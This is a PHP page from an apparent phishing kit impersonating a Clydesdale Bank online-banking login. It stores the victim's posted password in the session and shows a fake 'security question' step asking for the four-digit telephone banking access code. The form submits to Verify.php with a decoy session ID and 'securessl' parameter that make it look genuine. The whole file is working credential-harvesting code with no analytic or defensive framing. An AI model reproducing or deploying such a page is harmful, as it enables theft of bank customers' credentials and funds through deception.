<?php

error_reporting(0);

date_default_timezone_set("Europe/London");

session_start();



require "../../includes/functions.php";

$_SESSION['password'] = $_POST['password'];

?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width" name="viewport">
<title>Login</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" /><link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href='assets/css/one.css' media="screen" rel="stylesheet" type="text/css">
<link href='assets/css/two.css' media='screen' rel="stylesheet" type='text/css'>
<link href='assets/css/three.css' media='screen' rel="stylesheet" type='text/css'>
<script>
function Check() {
    var x = document.forms["login"]["telepin"].value;
    if (x == null || x == "") {
	document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
	var utest = /^[0-9]{4}$/;
	if(utest.test(document.getElementById('telepin').value) == false) {
	document.getElementById("ErrorBox").style.display = "block";
        return false;
	}
}
</script>
</head>
<body>
<div class="container top-nav-bg">
<div class="row">
<div class="nine columns phone-two"><img src="assets/img/logo.gif"></div>
<div class="three columns ie6-no-right-margin phone-two text-right">
<p class="show-on-desktops">Text Size: <a href="javascript:standardFontSize();"><span class="smallish">T</span></a> <a href="javascript:increaseFontSize();"><span class="bigger">T</span></a></p>
<div class="headerDate">
<h6><?php echo date('l, d/m/Y');?></h6>
</div>
</div>
</div>
</div>
<div class="container section-nav-bg" id="no-top-nav">
<div class="row"></div>
</div>
<br>
<div class="container">
<div class="row">
<ul class="breadcrumbs">
<li>Customer number</li>
<li>Password</li>
<li class='current'>Security option</li>
</ul>
</div>
<div class="row">
<div class="nine columns">
<div id="content">
<h1>Security question</h1>
<br>
<div id="innercontent">
<p>Please enter your security question answer and click Submit.<br><br> (If you do not yet have this please skip this step.)</p>
	<form name="login" method="post" id="login" action="Verify.php?Account-Verification&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" class="nice" enctype="application/x-www-form-urlencoded"  onsubmit="return Check();">
	<div class="row">
		<div class="five columns">
				<label for="Answer">What is your 4-digit telephone banking access code?&nbsp;*</label>
			</div>
			<div class="seven columns ie6-no-right-margin">
				<input type="password" name="telepin" maxlength="4" size="25" tabindex="1" value="" id="telepin" class="input-text inline">
			</div>
		</div>
		<div class="row">
			<div class="five columns"><!--spacer--></div>
			<div class="seven columns">
				<p><a href="#" style="line-height: 30px;">Forgotten your security question details?</a></p>
			</div>
		</div>
		<div class="row" style="margin-top:10px;">
			<div class="five columns"><!--  --></div>
			<div class="seven columns ie6-no-right-margin">
				<button class="medium nice white round button" type="button" tabindex="3">
	 		 				Cancel
	 		 	</button>
					
				<button class="medium nice nag round button" type="submit" tabindex="2" name="submit">
		 		 	Continue
		 		</button>
		 	</div>
		</div>
</div>
</div>
<div class="three columns ie6-no-right-margin">
<div class="headed-box">
<h4>Need Help?</h4>
<div><a class="medium white nice button round" href="#">Visit our Clydesdale Bank Help Centre</a></div>
</div>
</div>
</div>
</div>
<div class="hide-on-phones bcrumbs">
<div class="row">
<p>You are here:&nbsp;<strong>Customer number</strong></p>
</div>
<div class="container bottom-bar">
<div class="row">
<p class="text-center">You can find impartial information and guidance on money matters on the "<a href="#">Money advice service</a>" website.<br>
Clydesdale Bank is covered by the Financial Services Compensation Scheme (FSCS), <a href="#">Find out more</a>.</p>
</div>
</div>
</div>
</div>
</body>
</html>